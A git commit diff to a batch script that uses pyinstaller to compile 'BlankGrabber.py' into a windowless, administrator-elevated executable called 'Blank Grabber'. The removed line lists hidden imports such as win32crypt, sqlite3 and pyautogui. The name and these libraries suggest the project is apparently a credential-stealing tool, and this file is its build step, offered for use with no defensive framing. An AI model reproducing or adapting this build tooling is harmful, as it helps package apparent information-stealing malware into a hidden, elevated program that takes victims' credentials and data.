9b40e6fa8b17f58ee24ed7fc6b5d59bd66c80f8c
Blank <94945186+Blank-c@users.noreply.github.com>
2022-03-26 15:54:04 +0530

    Update Convert to exe.bat
    Updated pyinstaller command

--- Convert to exe.bat
+++ Convert to exe.bat
@@ -1,6 +1,6 @@
 @echo off
 title Converting to exe...
-pyinstaller --clean --onefile BlankGrabber.py --noconsole --uac-admin --hidden-import=requests  --hidden-import=psutil --hidden-import=pyautogui --hidden-import=sqlite3 --hidden-import=win32crypt --noconfirm --log-level CRITICAL --name "Blank Grabber"
+pyinstaller --clean --onefile BlankGrabber.py --noconsole --uac-admin --noconfirm --name "Blank Grabber"
 cls
 echo Done! (press any key to exit)
 pause >> NUL
